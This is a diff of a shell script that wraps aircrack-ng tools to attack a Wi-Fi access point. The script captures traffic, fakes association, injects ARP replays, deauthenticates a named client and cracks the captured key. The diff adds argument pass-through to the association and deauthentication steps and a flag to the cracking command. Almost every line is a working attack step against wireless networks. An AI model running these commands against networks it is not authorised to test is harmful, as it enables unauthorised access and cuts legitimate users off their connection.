@@ -54,7 +54,11 @@ monitor=${wlanif}mon
 [ x$1 = xdump ] && airodump-ng -c $channel --bssid $ap_mac -w output $monitor
 
 # associate with ap - you eventually want to call this in a loop with sleep 60
-[ x$1 = xassoc ] && aireplay-ng -1 0 -a $ap_mac -e "$essid" -h $ownmac $monitor
+[ x$1 = xassoc ] && {
+	shift
+	aireplay-ng -1 0 -a $ap_mac -e "$essid" -h $ownmac $monitor "$@"
+
+}
 
 # arp attack
 [ x$1 = xarp ] && aireplay-ng -3 -b $ap_mac -h $ownmac $monitor
@@ -72,7 +76,7 @@ if [ x$1 = xarpr ] ; then
 	[ -z "$repl" ] && echo "no sufficient capture file found"
 fi
 
-[ x$1 = xcrack ] && aircrack-ng -b $ap_mac output*.cap
+[ x$1 = xcrack ] && aircrack-ng -s -b $ap_mac output*.cap
 
 # alternate crack method - doesn't stop when out of IVs but apparently
 # requires a lot more of them
@@ -84,7 +88,10 @@ if [ x$1 = xdeauth ] ; then
 		echo "need client mac address!" >&2
 		exit 1
 	fi
-	aireplay-ng -0 1 -a $ap_mac -c $2 $monitor
+	victim=$2
+	shift
+	shift
+	aireplay-ng -0 1 -a $ap_mac -c $victim $monitor "$@"
 fi
 
 [ x$1 = xstopmon ] && airmon-ng stop $monitor
